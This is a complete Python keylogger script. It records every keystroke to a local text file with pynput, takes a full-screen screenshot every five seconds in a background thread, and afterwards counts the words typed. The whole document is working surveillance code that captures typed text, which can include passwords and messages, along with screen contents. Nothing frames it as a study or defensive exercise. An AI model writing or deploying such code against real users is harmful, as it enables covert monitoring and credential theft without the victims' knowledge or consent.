from pynput import keyboard
from collections import Counter
import re
from PIL import ImageGrab
import threading
import time

# Function to write logged keys to a file
def write(text):
    try:
        with open("keylogger.txt", 'a') as f:
            f.write(text)
    except IOError as e:
        print(f"Error writing to file: {e}")

# Function to handle key press events
def on_key_press(Key):
    try:
        if Key == keyboard.Key.enter:
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif Key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif Key == keyboard.Key.space:
            write(" ")
        else:
            temp = repr(Key) + " Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

# Function to handle key release events
def on_key_release(Key):
    # Stop the keylogger when the "esc" key is released
    if Key == keyboard.Key.esc:
        return False

# Function to take a screenshot
def take_screenshot():
    """
    Take a screenshot and save it as an image file.
    """
    count = 1  # To keep track of screenshot numbers
    while True:
        try:
            screenshot = ImageGrab.grab()
            filename = f"screenshot_{count}.png"
            screenshot.save(filename)
            print(f"Screenshot saved to '{filename}'")
            count += 1
            time.sleep(5)  # Wait for 5 seconds before taking the next screenshot
        except Exception as e:
            print(f"Error taking screenshot: {e}")
            break

# Function to analyze the keylogger output
def analyze_keylogs(file_path):
    """
    Analyze the keylogger file to count all words and provide insights.
    """
    try:
        with open(file_path, 'r') as f:
            data = f.read()
        
        # Use regex to extract words (ignoring special characters and spaces)
        words = re.findall(r'\b\w+\b', data.lower())
        
        # Count total characters logged
        char_count = len(data)
        
        # Count occurrences of each word
        word_count = Counter(words)
        
        print(f"Analysis of '{file_path}':")
        print(f"Total Characters Logged: {char_count}")
        print(f"Total Words Logged: {len(words)}")
        print("\nWord Frequency:")
        
        for word, count in word_count.items():
            print(f"{word}: {count}")
        
        return char_count, word_count
    
    except FileNotFoundError:
        print(f"Error: The file '{file_path}' does not exist.")
        return None

# Start the screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
screenshot_thread.start()

# Start the keylogger listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Call the new function to analyze keylogs (optional; can be done after stopping the program)
analyze_keylogs("keylogger.txt")
